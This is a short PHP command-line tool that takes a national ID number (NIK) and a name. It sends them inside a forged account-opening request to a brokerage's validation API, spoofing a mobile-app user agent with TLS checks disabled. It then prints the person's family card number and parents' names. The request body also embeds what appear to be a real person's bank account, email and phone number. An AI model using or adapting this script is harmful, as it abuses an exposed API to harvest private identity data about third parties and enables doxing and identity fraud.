<?php

$headers = array();
    $headers[] = 'Content-Type: application/json; charset=UTF-8';
    $headers[] = 'User-Agent: okhttp/3.3.0';

echo color('blue', "[+]")." NIK : ";
$nik = trim(fgets(STDIN));
echo color('blue', "[+]")." JENENG : ";
$nama = trim(fgets(STDIN));

$gas = curl('https://support.mncsekuritas.id/ws/api/oas/oasOpeningAccount/validate', '{"BankId":"BCA","BankNamaRekening":"MUHAMAD DIMAS PRATAMA","BankNoRekening":"1050020637","CreatedBy":"","CreatedDate":"2021-01-02 01:31:23","DeviceDesc":"MI 8|1.7.12","DeviceFlag":"A","Email":"fuaddragnett@gmail.com","FailedCounterBank":0,"FailedCounterMisscall":0,"FailedCounterNik":2,"FailedCounterOtp":0,"Hp":"81331720800","IdentitasSeumurHidup":true,"IsActive":true,"IsAlamatSama":true,"IsOtpSms":true,"IsProdukMnc":true,"KeluargaIdentitasMasaBerlakuFlag":true,"KeluargaIdentitasMasaBerlakuTanggal":"9999-12-31 00:00:00","MasaBerlakuIdentitasTanggal":"9999-12-31 00:00:00","ModifiedBy":"","ModifiedDate":"2021-01-03 12:05:54","NamaLengkap":"'.$nama.'","Nik":"'.$nik.'","NoRt":0,"NoRw":0,"RegId":122051,"TanggalLahir":"2021-01-02 00:00:00","_id":1}', $headers);

	$sec = json_decode($gas[1])->Result->Nik;
	$sec1 = json_decode($gas[1])->Result->NoKK;
	$sec2 = json_decode($gas[1])->Result->NamaLengkap;
	$sec3 = json_decode($gas[1])->Result->NamaLengkapAyah;
	$sec4 = json_decode($gas[1])->Result->NamaLengkapIbu;
	$se = json_decode($gas[1])->Success;
	if ($se == true) {
		echo "\n";
	echo color('blue', "[+]")."NIK      : ".$sec."\n";
	echo color('blue', "[+]")."NOKK     : ".$sec1."\n";
	echo color('blue', "[+]")."NAMA     : ".$sec2."\n";
	echo color('blue', "[+]")."NAMA AYAH: ".$sec3."\n";
	echo color('blue', "[+]")."NAMA IBU : ".$sec4."\n";
	} else {
		$satu = json_decode($gas[1])->Message;
		print_r($satu);
	}
	
	
		
		//sleep(2);
	
		

function curl($url, $post, $headers, $follow = false, $method = null)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		if ($follow == true) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		if ($method !== null) curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
		if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		$result = curl_exec($ch);
		$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
		$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
		$cookies = array();
		foreach ($matches[1] as $item) {
			parse_str($item, $cookie);
			$cookies = array_merge($cookies, $cookie);
		}
		return array(
			$header,
			$body,
			$cookies
		);
	}

function color($color = "default" , $text)
    {
        $arrayColor = array(
            'red'       => '1;31',
            'green'     => '1;32',
            'yellow'    => '1;33',
            'blue'      => '1;34',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }